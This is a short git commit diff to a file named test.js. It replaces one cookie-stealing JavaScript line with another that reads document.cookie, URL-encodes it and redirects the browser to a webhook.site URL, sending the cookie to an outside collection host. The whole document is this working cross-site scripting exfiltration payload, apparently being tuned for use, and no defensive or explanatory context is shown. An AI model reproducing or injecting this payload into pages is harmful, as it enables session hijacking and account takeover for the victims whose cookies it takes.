cbe94a3969cf97a15bf03f946268e441476bf4c0
wldldlq <smjy01@gmail.com>
2024-09-26 15:42:30 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,2 @@
-location.href="	https://webhook.site/44750bd9-9817-43ec-9086-bab8119e97a3?q=".concat(document.cookie);
+var cookieValue = document.cookie;
+location.href = "https://webhook.site/44750bd9-9817-43ec-9086-bab8119e97a3?q=" + encodeURIComponent(cookieValue);
